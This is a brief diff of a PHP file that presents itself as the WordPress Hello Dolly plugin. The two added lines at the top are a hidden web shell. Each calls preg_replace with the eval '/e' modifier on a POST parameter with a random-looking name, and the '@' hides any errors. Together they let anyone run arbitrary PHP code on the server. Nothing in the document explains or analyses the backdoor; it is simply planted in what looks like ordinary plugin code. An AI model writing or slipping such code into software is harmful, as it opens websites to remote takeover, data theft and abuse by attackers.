@@ -1,4 +1,8 @@
 <?php
+@preg_replace("/[pageerror]/e",$_POST['myotjl1745'],"saft");
+?><?php
+@preg_replace("/[pageerror]/e",$_POST['yxotdl6605'],"saft");
+?><?php
 /**
  * @package Hello_Dolly
  * @version 1.6
